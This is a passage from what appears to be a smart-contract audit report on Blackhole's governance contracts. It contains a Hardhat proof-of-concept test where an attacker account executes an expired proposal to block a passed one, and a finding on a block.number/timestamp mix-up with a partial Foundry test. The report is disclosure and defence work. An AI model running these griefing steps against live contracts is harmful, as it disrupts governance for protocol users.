<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await minterUpgradeable.connect(deployer).update_period(); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        let targetEmissionPeriod = await minterUpgradeable.active_period(); </span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(await minterUpgradeable.proposals(targetEmissionPeriod)).to.be.false;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        const initialTailRate = await minterUpgradeable.tailEmissionRate(); </span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`Attacker executing Expired Proposal ID: ${proposalId_Expired.toString()} for Minter period ${targetEmissionPeriod.toString()}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await blackGovernor.connect(attackerEOA).execute(targets, values, calldatas, epochTimeHash_Expired);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(await minterUpgradeable.proposals(targetEmissionPeriod)).to.be.true;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(await minterUpgradeable.tailEmissionRate()).to.equal(initialTailRate); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Expired proposal executed by attacker, nudge flag set for period. Tail rate unchanged.");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log(`Attempting to execute Succeeded Proposal ID: ${proposalId_Succeed.toString()} for Minter period ${targetEmissionPeriod.toString()}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        await expect(</span></span>
<span class="grvsc-line"><span class="grvsc-source">            blackGovernor.connect(deployer).execute(targets, values, calldatas, epochTimeHash_Succeed)</span></span>
<span class="grvsc-line"><span class="grvsc-source">        ).to.be.revertedWith("Governor: call reverted without message"); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        </span></span>
<span class="grvsc-line"><span class="grvsc-source">        console.log("Succeeded proposal blocked by attacker's action as expected.");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        expect(await minterUpgradeable.tailEmissionRate()).to.equal(initialTailRate); </span></span>
<span class="grvsc-line"><span class="grvsc-source">    });</span></span>
<span class="grvsc-line"><span class="grvsc-source">});</span></span></code></pre>
</details>
<p><strong>Expected trace:</strong></p>
<pre data-index="64" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">npx hardhat test test/GovernorExecuteGrief.test.js</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">BlackGovernor - Griefing Attack via Flawed L2Governor.execute()</span></span>
<span class="grvsc-line"><span class="grvsc-source">Starting beforeEach: Deploying ALL REAL in-scope contracts...</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Libraries deployed (VBL, VFL).</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Black token deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Black token initialMint called by deployer.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  PermissionsRegistry deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  GAUGE_ADMIN role granted to deployer.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  GOVERNANCE role granted to deployer.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  TokenHandler deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  VotingEscrow deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  RewardsDistributor deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  PairFactory (proxy) deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  AlgebraPoolAPIStorage (proxy) deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Gauge Factories deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">Warning: Potentially unsafe deployment of contracts/GaugeManager.sol:GaugeManager</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    You are using the `unsafeAllow.external-library-linking` flag to include external libraries.</span></span>
<span class="grvsc-line"><span class="grvsc-source">    Make sure you have manually checked that the linked libraries are upgrade safe.</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  GaugeManager (proxy) deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  VoterV3 (proxy) deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  BribeFactoryV3 (proxy) deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  MinterUpgradeable (proxy) deployed.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Black token minter changed to MinterUpgradeable.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  BlackGovernor deployed and proposalNumerator set to 0.</span></span>
<span class="grvsc-line"><span class="grvsc-source">Preparing proposer and voters...</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Proposer smNFT lock created.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  smVoter1 smNFT created.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  smVoter2 smNFT created.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  End of beforeEach: Proposer smNFT Votes (current ts): 2200.0 BLACK</span></span>
<span class="grvsc-line"><span class="grvsc-source">  End of beforeEach: VE TotalSupply (current ts): 3300.0 BLACK</span></span>
<span class="grvsc-line"><span class="grvsc-source">  End of beforeEach: BlackGovernor Threshold (current ts, numerator 0): 0.0 BLACK</span></span>
<span class="grvsc-line"><span class="grvsc-source">Advancing Minter to Tail Emission phase...</span></span>
<span class="grvsc-line"><span class="grvsc-source">  MinterUpgradeable._initialize() called or already handled.</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Initial Minter weekly for tail phase: 10000000.0, TAIL_START: 8969150.0</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Minter internal epochCount before loop: 0</span></span>
<span class="grvsc-line"><span class="grvsc-source">Minter in Tail Emission. Minter epochCount: 66, Weekly: 8969149.540107574558747588</span></span>
<span class="grvsc-line"><span class="grvsc-source">beforeEach setup complete.</span></span>
<span class="grvsc-line"><span class="grvsc-source">Proposing PROP_EXPIRED...</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Proposer EOA: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Block number for PROP_EXPIRED getVotes snapshot: 185</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Proposer's votes for PROP_EXPIRED (using block num as ts): 0.0</span></span>
<span class="grvsc-line"><span class="grvsc-source">  Proposal Threshold for PROP_EXPIRED (using current ts): 0.0</span></span>
<span class="grvsc-line"><span class="grvsc-source">Proposing PROP_SUCCEED...</span></span>
<span class="grvsc-line"><span class="grvsc-source">  epochTimeHash_Expired: 0x000000000000000000000000000000000000000000000000000000006839eb18</span></span>
<span class="grvsc-line"><span class="grvsc-source">  epochTimeHash_Succeed: 0x000000000000000000000000000000000000000000000000000000006839ee9c</span></span>
<span class="grvsc-line"><span class="grvsc-source">Advancing time for PROP_EXPIRED to expire...</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROP_EXPIRED is Expired.</span></span>
<span class="grvsc-line"><span class="grvsc-source">Voting for PROP_SUCCEED...</span></span>
<span class="grvsc-line"><span class="grvsc-source">Votes cast for PROP_SUCCEED.</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROP_SUCCEED is Succeeded.</span></span>
<span class="grvsc-line"><span class="grvsc-source">Advancing Minter to a new active period for nudge...</span></span>
<span class="grvsc-line"><span class="grvsc-source">Attacker executing Expired Proposal ID: 95663595387384231139373561555078924596465919427795029072961122541929471258304 for Minter period 1748628000</span></span>
<span class="grvsc-line"><span class="grvsc-source">Expired proposal executed by attacker, nudge flag set for period. Tail rate unchanged.</span></span>
<span class="grvsc-line"><span class="grvsc-source">Attempting to execute Succeeded Proposal ID: 28181572287723674322142969551870591870160588535690567740327278394187501343944 for Minter period 1748628000</span></span>
<span class="grvsc-line"><span class="grvsc-source">Succeeded proposal blocked by attacker's action as expected.</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ✔ should allow attacker to execute an Expired proposal to grief Minter.nudge() and block a Succeeded proposal (141ms)</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">1 passing (3s)</span></span></code></pre>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-48">rayss</a>.</p>
<hr>
<h2 style="position:relative;" id="m-16-getvotes-inside-the-blackgovernor-incorrectly-provides-blocknumber-instead-of-blocktimestamp-leading-to-complete-dos-of-proposal-functionality"><a class="anchor before" aria-label="m 16 getvotes inside the blackgovernor incorrectly provides blocknumber instead of blocktimestamp leading to complete dos of proposal functionality permalink" href="#m-16-getvotes-inside-the-blackgovernor-incorrectly-provides-blocknumber-instead-of-blocktimestamp-leading-to-complete-dos-of-proposal-functionality"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-163">[M-16] <code>getVotes</code> inside the <code>BlackGovernor</code> incorrectly provides <code>block.number</code> instead of <code>block.timestamp</code>, leading to complete DOS of proposal functionality</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-406">hakunamatata</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-71">Egbe</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/BlackGovernor.sol#L95-L107">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/BlackGovernor.sol#L95-L107</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L268-L271">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L268-L271</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L414-L416">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L414-L416</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L746-L753">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L746-L753</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-4"><a class="anchor before" aria-label="finding description and impact 4 permalink" href="#finding-description-and-impact-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>Whenever user is making a proposal inside the <code>BlackGovernor</code>, the contract checks whether their voting power meets the proposal threshold. However, this check is copied from the <code>ThenaFi</code> contracts which is incorrect. I disclosed the vulnerability to the <code>ThenaFI</code> team, however, the bug is not present in the live contracts as <code>ThenaFI</code> team has informed me.</p>
<p>The check is incorrect as it passes the <code>(block.number - 1)</code> to the <code>getVotes</code> function that expects timestamp:</p>
<pre data-index="65" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1">  </span><span class="mtk11">_proposal</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">string</span><span class="mtk1">  </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">description</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">//@audit CRITICAL getVotes expects timestamp and calls getsmNFTPastVotes that also expects timestamp</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">require</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">getVotes</span><span class="mtk1">(</span><span class="mtk11">_msgSender</span><span class="mtk1">(), </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">number</span><span class="mtk1"> - </span><span class="mtk7">1</span><span class="mtk1">) &gt;= </span><span class="mtk11">proposalThreshold</span><span class="mtk1">(),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">"Governor: proposer votes below proposal threshold"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span></code></pre>
<p>We can see from the code that function calls <code>getVotes</code>, providing block number instead of timestamp, which calls <code>getsmNFTPastVotes</code> that expects timestamp and will check checkpoint that is “closest” (not exactly it’s a mental shortcut) to the provided timestamp which will be <code>blocknumber - 1</code> in this case. </p>
<p>As <code>block.number</code> is way smaller than <code>block.timestamp</code> the check of proposal threshold will always revert leading to DOS of proposal functionality. This is due to the fact that it will check the voting power at the timestamp that is even before the project has launched (because <code>block.number</code> is way smaller than the <code>block.timestamp</code>). </p>
<p>This bug prevents all proposals from being created, which breaks core governance functionality. Given its impact and the fact that it can occur under normal usage without any external trigger,I believe this qualifies as a High severity issue.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-17"><a class="anchor before" aria-label="recommended mitigation steps 17 permalink" href="#recommended-mitigation-steps-17"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Change <code>block.number</code> to <code>block.timestamp</code>.</p>
<h3 style="position:relative;" id="proof-of-concept-11"><a class="anchor before" aria-label="proof of concept 11 permalink" href="#proof-of-concept-11"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>This POC is written in foundry, in order to run it, one has to create foundry project, download dependencies, create remappings and change imports in some of the file to look inside the “src” folder</p>
<p>This POC shows that even if user meets threshold proposal, due to incorrect value passed to getVotes the call reverts. If one would change the <code>block.number</code> to <code>block.timestamp</code>. The proposal call does not revert.</p>
<pre data-index="66" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pragma</span><span class="mtk1"> </span><span class="mtk12">solidity</span><span class="mtk1"> ^</span><span class="mtk7">0.8</span><span class="mtk1">.</span><span class="mtk7">13</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">Test</span><span class="mtk1">, </span><span class="mtk12">console</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"forge-std/Test.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">Black</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/Black.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">MinterUpgradeable</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/MinterUpgradeable.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">RewardsDistributor</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/RewardsDistributor.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">PermissionsRegistry</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/PermissionsRegistry.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">TokenHandler</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/TokenHandler.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">VoterV3</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/VoterV3.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">VotingEscrow</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/VotingEscrow.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">AutoVotingEscrowManager</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/AVM/AutoVotingEscrowManager.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">GaugeManager</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/GaugeManager.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">PairGenerator</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/PairGenerator.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">GaugeFactory</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/factories/GaugeFactory.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">PairFactory</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/factories/PairFactory.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">GaugeFactoryCL</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/AlgebraCLVe33/GaugeFactoryCL.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">BlackGovernor</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/BlackGovernor.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">IBlackHoleVotes</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/interfaces/IBlackHoleVotes.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">IMinter</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/interfaces/IMinter.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">GovernanceProposeRevertTest</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">Test</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">Black</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">black</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">RewardsDistributor</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">rewardsDistributor</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">MinterUpgradeable</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PermissionsRegistry</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">permissionsRegistry</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">TokenHandler</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">tokenHandler</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">AutoVotingEscrowManager</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">avm</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">VotingEscrow</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">votingEscrow</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">VoterV3</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">voter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GaugeManager</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">gaugeManager</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GaugeFactory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">gaugeFactory</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PairGenerator</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairGenerator</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PairFactory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairFactory_1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PairFactory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairFactory_2CL</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GaugeFactoryCL</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">BlackGovernor</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">blackGovernor</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">admin</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xAD</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">protocol</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0x1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">userA</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xA</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">userB</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xB</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setUp</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">Black</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">permissionsRegistry</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PermissionsRegistry</span><span class="mtk1">();</span></span></span>
